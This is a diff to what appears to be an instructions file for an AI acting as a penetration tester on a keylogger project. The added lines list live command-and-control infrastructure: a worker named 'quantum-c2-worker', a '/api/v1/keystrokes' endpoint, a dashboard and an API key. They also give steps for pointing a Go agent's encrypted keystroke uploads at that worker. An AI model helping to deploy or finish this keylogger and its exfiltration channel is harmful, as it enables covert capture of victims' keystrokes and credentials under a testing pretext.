@@ -9,6 +9,21 @@ You are an expert cybersecurity penetration tester and software QA engineer. You
 - **Clone:** `git clone https://github.com/422442/Logger.git`
 - **Project root:** `C:\Users\Ns8pc\Pictures\keylogger\`
 
+## DEPLOYED URLs (Update test prompt with these)
+- **Cloudflare Worker:** `https://quantum-c2-worker.ns8pc1.workers.dev`
+- **Backend (Docker):** `http://localhost:8080` (running locally, needs public URL for Worker)
+- **Vercel Dashboard:** `https://dashboard-ten-self-33.vercel.app/`
+- **Worker API Key:** `QC-ELITE-VIPER-KEY-2024-REPLACE-ME`
+- **Agent Worker URL:** `https://quantum-c2-worker.ns8pc1.workers.dev/api/v1/keystrokes`
+
+### URLs to Update After Deployment:
+- Replace `REPLACE_WITH_RENDER_URL` in `worker/wrangler.toml` and `worker/worker.ts` with actual Render backend URL
+- Replace `REPLACE_WITH_API_KEY` in `worker/wrangler.toml` with actual Cloudflare API key
+- Set `NEXT_PUBLIC_BACKEND_WS` env var in Vercel to `wss://RENDER_BACKEND_URL/ws`
+- Set `workerURL` in `agent/main.go` to actual Worker URL
+- Update `aesKey` in `agent/main.go` to a 32-byte key
+- Set `apiKey` in `agent/main.go` to the same API key as Worker
+
 ## FULL PROJECT CONTEXT
 
 ### Architecture Overview
